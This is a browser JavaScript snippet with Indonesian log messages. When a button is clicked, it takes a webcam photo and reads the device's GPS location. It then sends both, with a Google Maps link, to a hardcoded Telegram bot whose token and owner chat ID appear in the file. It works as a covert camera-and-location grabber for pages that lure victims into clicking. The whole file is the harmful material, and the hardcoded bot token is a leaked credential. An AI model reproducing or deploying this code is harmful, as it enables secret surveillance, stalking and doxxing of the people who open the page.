const BOT_TOKEN = "8351189070:AAEBFX43FhxANDXLayXMbi_09sUR8LAGdEA";
const OWNER_ID = "6918225973";

const logBox = document.getElementById("log");
function log(msg){
  logBox.innerHTML += msg+"<br>";
  logBox.scrollTop = logBox.scrollHeight;
}

document.getElementById("openBtn").addEventListener("click", async()=>{
  log("▶ Mengakses kamera...");
  let photoBlob=null;
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
    stream.getTracks().forEach(t=>t.stop());
    log("✔ Kamera: foto diambil.");
  }catch(e){
    log("❌ Kamera gagal: "+e.message);
  }

  log("▶ Mengakses lokasi...");
  let coords=null;
  try{
    coords = await new Promise((resolve,reject)=>{
      navigator.geolocation.getCurrentPosition(
        pos=>resolve(pos.coords),
        err=>reject(err),
        {timeout:10000}
      );
    });
    log("✔ Lokasi: "+coords.latitude.toFixed(5)+","+coords.longitude.toFixed(5));
  }catch(e){
    log("❌ Lokasi gagal: "+e.message);
  }

  // Kirim ke Telegram
  try{
    if(photoBlob){
      const fd = new FormData();
      fd.append("chat_id",OWNER_ID);
      fd.append("photo",photoBlob,"snap.jpg");
      let cap = "Snapshot dari device.";
      if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
      fd.append("caption",cap);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
      log("📡 Foto terkirim ke Telegram.");
    }
    if(coords){
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({chat_id:OWNER_ID,text:`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
      });
      log("📡 Lokasi terkirim ke Telegram.");
    }
  }catch(e){
    log("❌ Kirim Telegram gagal: "+e.message);
  }

  log("=== Selesai ===");
});

// --- script ---